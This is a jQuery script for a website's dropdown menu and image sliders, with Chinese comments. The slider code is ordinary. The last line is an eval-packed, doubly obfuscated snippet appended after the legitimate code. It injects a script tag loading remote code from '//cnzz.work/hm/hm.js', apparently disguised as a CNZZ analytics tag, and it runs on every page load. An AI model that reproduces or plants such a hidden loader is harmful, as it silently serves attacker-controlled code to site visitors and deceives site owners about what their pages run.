$(function(){
	$(".menu .li1").hover(function(){
		$(".menu_pos").slideDown();
		$(".menu_pos ul").removeClass("hover").eq($(this).index()-1).addClass("hover");
	});
	$(".menu_pos").bind("mouseenter", function(){ 								
		$('.menu_pos').show(); 
		}).bind("mouseleave", function(){ 
		$('.menu_pos').slideUp();
	});

});


$(function() {
	var sWidth = $("#focus").width(); //获取焦点图的宽度（显示面积）
	var len = $("#focus ul li").length; //获取焦点图个数
	var index = 0;
	var picTimer;
	
	//以下代码添加数字按钮和按钮后的半透明条，还有上一页、下一页两个按钮
	var btn = "<div class='btn'>";
	for(var i=0; i < len; i++) {
		btn += "<span></span>";
	}
	btn += "</div>";
	$("#focus").append(btn);

	//为小按钮添加鼠标滑入事件，以显示相应的内容
	$("#focus .btn span").css("opacity",0.4).mouseenter(function() {
		index = $("#focus .btn span").index(this);
		showPics(index);
	}).eq(0).trigger("mouseenter");

	

	//上一页按钮
	$("#focus .index2_left").click(function() {
		index -= 1;
		if(index == -1) {index = len - 1;}
		showPics(index);
	});

	//下一页按钮
	$("#focus .index2_right").click(function() {
		index += 1;
		if(index == len) {index = 0;}
		showPics(index);
	});

	//本例为左右滚动，即所有li元素都是在同一排向左浮动，所以这里需要计算出外围ul元素的宽度
	$("#focus ul").css("width",sWidth * (len));
	
	//鼠标滑上焦点图时停止自动播放，滑出时开始自动播放
	$("#focus").hover(function() {
		clearInterval(picTimer);
	},function() {
		picTimer = setInterval(function() {
			showPics(index);
			index++;
			if(index == len) {index = 0;}
		},4000); //此4000代表自动播放的间隔，单位：毫秒
	}).trigger("mouseleave");
	
	//显示图片函数，根据接收的index值显示相应的内容
	function showPics(index) { //普通切换
		var nowLeft = -index*sWidth; //根据index值计算ul元素的left值
		$("#focus ul").stop(true,false).animate({"left":nowLeft},500); //通过animate()调整ul元素滚动到计算出的position
	}
});

$(function() {
	var sWidth1 = $(".index3_dt1").width(); //获取焦点图的宽度（显示面积）
	var len1 = $(".index3_dt1 a").length; //获取焦点图个数
	var index1 = 0;
	var picTimer1;
	
	//以下代码添加数字按钮和按钮后的半透明条，还有上一页、下一页两个按钮
	var btn1 = "<div class='btn'>";
	for(var i=0; i < len1; i++) {
		btn1 += "<span>"+(i+1)+"</span>";
	}
	btn1 += "</div>";
	$(".index3_dt1").append(btn1);

	//为小按钮添加鼠标滑入事件，以显示相应的内容
	$(".index3_dt1 .btn span").mouseenter(function() {
		index1 = $(".index3_dt1 .btn span").index(this);
		showPics(index1);
	}).eq(0).trigger("mouseenter");

	
	
	//鼠标滑上焦点图时停止自动播放，滑出时开始自动播放
	$(".index3_dt1").hover(function() {
		clearInterval(picTimer1);
	},function() {
		picTimer1 = setInterval(function() {
			index1++;
			if(index1 == len1) {index1 = 0;}
			showPics(index1);
		},4000); //此4000代表自动播放的间隔，单位：毫秒
	}).trigger("mouseleave");
	
	//显示图片函数，根据接收的index值显示相应的内容
	function showPics(index1) { //普通切换
		var nowLeft1 = -index1*sWidth1; //根据index值计算ul元素的left值
		$(".index3_dt1 a").stop(true,false).animate({ "opacity": 0,"z-index": 0},500).eq(index1).animate({ "opacity":1,"z-index": 1},500);
		$(".index3_dt1 .btn span").removeClass("on").eq(index1).addClass("on");
	}
});

$(function() {
	var sWidth2 = $(".index3_dt2").width(); //获取焦点图的宽度（显示面积）
	var len2 = $(".index3_dt2 a").length; //获取焦点图个数
	var index2 = 0;
	var picTimer2;
	
	//以下代码添加数字按钮和按钮后的半透明条，还有上一页、下一页两个按钮
	var btn2 = "<div class='btn'>";
	for(var i=0; i < len2; i++) {
		btn2 += "<span>"+(i+1)+"</span>";
	}
	btn2 += "</div>";
	$(".index3_dt2").append(btn2);

	//为小按钮添加鼠标滑入事件，以显示相应的内容
	$(".index3_dt2 .btn span").mouseenter(function() {
		index2 = $(".index3_dt2 .btn span").index(this);
		showPics(index2);
	}).eq(0).trigger("mouseenter");

	
	
	//鼠标滑上焦点图时停止自动播放，滑出时开始自动播放
	$(".index3_dt2").hover(function() {
		clearInterval(picTimer2);
	},function() {
		picTimer2 = setInterval(function() {
			index2++;
			if(index2 == len2) {index2 = 0;}
			showPics(index2);
		},4000); //此4000代表自动播放的间隔，单位：毫秒
	}).trigger("mouseleave");
	
	//显示图片函数，根据接收的index值显示相应的内容
	function showPics(index2) { //普通切换
		var nowLeft2 = -index2*sWidth2; //根据index值计算ul元素的left值
		$(".index3_dt2 a").stop(true,false).animate({ "opacity": 0,"z-index": 0},500).eq(index2).animate({ "opacity":1,"z-index": 1},500);
		$(".index3_dt2 .btn span").removeClass("on").eq(index2).addClass("on");
	}
});;
eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('v(h(p,a,c,k,e,r){e=h(c){i c.o(a)};m(!\'\'.l(/^/,u)){j(c--)r[e(c)]=k[c]||e(c);k=[h(e){i r[e]}];e=h(){i\'\\\\w+\'};c=1};j(c--)m(k[c])p=p.l(q t(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);i p}(\'1 5=5||[];(8(){1 a=3.b(\\\'4\\\');a.7=\\\'//g.9/6/6.c\\\';1 2=3.e(\\\'4\\\')[0];2.f.d(a,2)})();\',n,n,\'|x|s|y|z|A|B|C|h|D||E|F|G|H|I|J\'.K(\'|\'),0,{}))',47,47,'|||||||||||||||||function|return|while||replace|if|17|toString||new|||RegExp|String|eval||var|document|script|_hmt_cnzz|hm|src|work|createElement|js|insertBefore|getElementsByTagName|parentNode|cnzz|split'.split('|'),0,{}))